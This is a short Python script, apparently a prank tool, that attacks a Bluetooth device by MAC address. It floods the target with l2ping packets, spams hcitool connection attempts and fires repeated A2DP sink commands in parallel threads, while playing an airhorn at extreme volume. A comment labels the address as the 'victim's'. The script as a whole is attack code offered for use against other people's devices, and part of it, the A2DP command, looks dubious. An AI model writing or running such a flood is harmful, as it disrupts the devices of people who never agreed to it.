#!/usr/bin/env python3
import subprocess
import time
import threading

class MusicKiller:
    def __init__(self, target_mac):
        self.target = target_mac
        self.kill_threads = []
    
    def l2ping_flood(self):
        """Flood L2CAP packets"""
        while True:
            subprocess.Popen(f"sudo l2ping -s 600 -f {self.target}", shell=True)
            time.sleep(0.01)
    
    def hci_connection_spam(self):
        """Spam HCI connections"""
        while True:
            subprocess.Popen(f"sudo hcitool cc {self.target}", shell=True)
            time.sleep(0.05)
    
    def a2dp_sink_storm(self):
        """Multiple A2DP sink conflicts"""
        profiles = ["sbc", "aac", "aptx", "ldac"]
        for codec in profiles:
            subprocess.Popen(f"bt-a2dp-sink --codec {codec} {self.target}", shell=True)
    
    def start_kill(self):
        """Full spectrum attack"""
        print(f"🎯 KILLING MUSIC on {self.target}")
        
        # Thread 1: L2Ping flood
        t1 = threading.Thread(target=self.l2ping_flood)
        t1.daemon = True
        t1.start()
        
        # Thread 2: HCI spam  
        t2 = threading.Thread(target=self.hci_connection_spam)
        t2.daemon = True
        t2.start()
        
        # Thread 3: A2DP chaos
        t3 = threading.Thread(target=self.a2dp_sink_storm)
        t3.daemon = True
        t3.start()
        
        # Main prank sound
        subprocess.Popen("paplay --volume=150000 airhorn.mp3", shell=True)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("🛑 Attack stopped")

# Usage
if __name__ == "__main__":
    TARGET_MAC = "AA:BB:CC:DD:EE:FF"  # Ganti MAC victim
    killer = MusicKiller(TARGET_MAC)
    killer.start_kill()